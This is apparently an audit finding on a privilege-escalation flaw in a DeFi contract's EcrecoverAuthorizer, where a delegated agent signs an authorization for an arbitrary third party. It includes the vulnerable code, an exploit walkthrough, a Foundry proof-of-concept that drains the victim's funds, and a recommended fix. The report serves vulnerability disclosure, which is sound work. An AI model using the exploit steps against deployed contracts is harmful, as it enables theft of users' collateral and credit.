### Title
Authorized Agent Can Grant Arbitrary Third-Party Authorizations via EcrecoverAuthorizer - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `IMidnight.isAuthorized(authorizer, signer)` returns `true` for, without restricting what `authorized` address the signer may name in the struct. This allows any Midnight-authorized agent of A to self-sign an `Authorization(authorizer=A, authorized=malicious, ...)` and successfully install `isAuthorized[A][malicious] = true` on Midnight, entirely without A's knowledge or direct signature.

### Finding Description
**Exact code path:**

In `EcrecoverAuthorizer.setIsAuthorized` (lines 33–36), after recovering the signer from the EIP-712 digest, the authorization check is:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

If the second branch is satisfied (`isAuthorized[A][attacker] == true`), the function proceeds unconditionally to:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [2](#0-1) 

`Midnight.setIsAuthorized` then checks only that `msg.sender` (the `EcrecoverAuthorizer` contract) is authorized by `onBehalf` (A):

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
isAuthorized[onBehalf][authorized] = newIsAuthorized;
``` [3](#0-2) 

**Attacker-controlled inputs:** `authorization.authorized` (the malicious address), `authorization.isAuthorized = true`, `authorization.nonce` (current nonce for A), `authorization.deadline` (any future timestamp), and a valid ECDSA signature over this struct made with the attacker's own private key.

**Exploit flow (preconditions → trigger → bad state):**

1. A calls `midnight.setIsAuthorized(ecrecoverAuthorizer, true, A)` — required for `EcrecoverAuthorizer` to act on A's behalf at all (standard setup, shown in tests).
2. A calls `midnight.setIsAuthorized(attacker, true, A)` — attacker is a legitimate authorized agent of A.
3. Attacker constructs `Authorization{authorizer: A, authorized: malicious, isAuthorized: true, nonce: nonce[A], deadline: future}` and signs it with the attacker's own private key.
4. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
5. `ecrecover` returns `attacker`; `signer == A` is false; `isAuthorized[A][attacker]` is true → check passes.
6. `EcrecoverAuthorizer` calls `midnight.setIsAuthorized(malicious, true, A)`; `isAuthorized[A][ecrecoverAuthorizer]` is true → check passes.
7. Final state: `isAuthorized[A][malicious] == true`.

**Why existing checks fail:** The `Unauthorized()` guard in `EcrecoverAuthorizer` only verifies that the signer is permitted to act for the authorizer; it does not verify that the signer is the one being authorized, nor does it restrict the `authorized` field in any way when the signer is a delegated agent rather than the authorizer themselves.

The existing test `testSetIsAuthorizedAuthorization` in `AuthorizationTest.sol` (lines 290–304) confirms that Midnight itself intentionally allows authorized agents to call `setIsAuthorized` on behalf of the authorizer — the vulnerability is that `EcrecoverAuthorizer` extends this to off-chain-signed authorizations without restricting the target. [4](#0-3) 

### Impact Explanation
Once `isAuthorized[A][malicious] == true`, `malicious` can call `withdraw`, `withdrawCollateral`, `repay`, and `setConsumed` on behalf of A without restriction. Concretely: `malicious` can drain A's credit via `withdraw`, seize A's collateral via `withdrawCollateral`, force-repay A's debt, and cancel A's offers via `setConsumed` (DoS on `take`). Additionally, the attacker burns A's `EcrecoverAuthorizer` nonce as a side effect, invalidating any pending off-chain-signed authorizations A may have issued.

### Likelihood Explanation
**Preconditions:** (1) A must have authorized `EcrecoverAuthorizer` on Midnight (required for the contract to be useful at all — any user of `EcrecoverAuthorizer` must do this); (2) A must have authorized the attacker on Midnight (attacker is a legitimate agent, e.g., a keeper or operator). Both are normal operational states. The attack is repeatable at any nonce increment and requires no special privileges beyond being an authorized agent.

### Recommendation
When the signer is not the authorizer themselves (i.e., the `isAuthorized` branch is taken), restrict the `authorized` field to equal the signer:

```solidity
require(
    signer == authorization.authorizer
        || (IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)
            && authorization.authorized == signer),
    Unauthorized()
);
```

This ensures a delegated agent can only authorize themselves, not arbitrary third parties. Alternatively, remove the `isAuthorized` branch entirely if the intent is that only the authorizer's own key may sign off-chain authorizations.

### Proof of Concept

```solidity
// Foundry unit test
function testAgentCanAuthorizeArbitraryThirdParty() public {
    address A       = makeAddr("A");
    address attacker = makeAddr("attacker");
    address malicious = makeAddr("malicious");

    // Step 1: A authorizes EcrecoverAuthorizer (standard setup)
    vm.prank(A);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, A);

    // Step 2: A authorizes attacker as a legitimate agent
    vm.prank(A);
    midnight.setIsAuthorized(attacker, true, A);

    // Step 3: Attacker self-signs Authorization(authorizer=A, authorized=malicious, isAuthorized=true)
    Authorization memory auth = Authorization({
        authorizer:   A,
        authorized:   malicious,
        isAuthorized: true,
        nonce:        ecrecoverAuthorizer.nonce(A),
        deadline:     block.timestamp + 1 days
    });
    Signature memory sig = signAuthorization(auth, attacker); // signed with attacker's key

    // Step 4: Attacker submits
    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Assertion: malicious is now authorized by A without A's direct signature
    assertTrue(midnight.isAuthorized(A, malicious));
    // Assertion: malicious can now withdraw A's funds
    vm.prank(malicious);
    midnight.withdraw(market, someUnits, A, malicious); // succeeds — funds drained
}
```

Expected: both assertions pass, confirming the invariant is broken.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-47)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L731-733)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
```

**File:** test/AuthorizationTest.sol (L290-304)
```text
    function testSetIsAuthorizedAuthorization(address user, address authorized, address newAuthorized) public {
        vm.assume(user != authorized);

        vm.prank(authorized);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setIsAuthorized(newAuthorized, true, user);

        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
    }
```
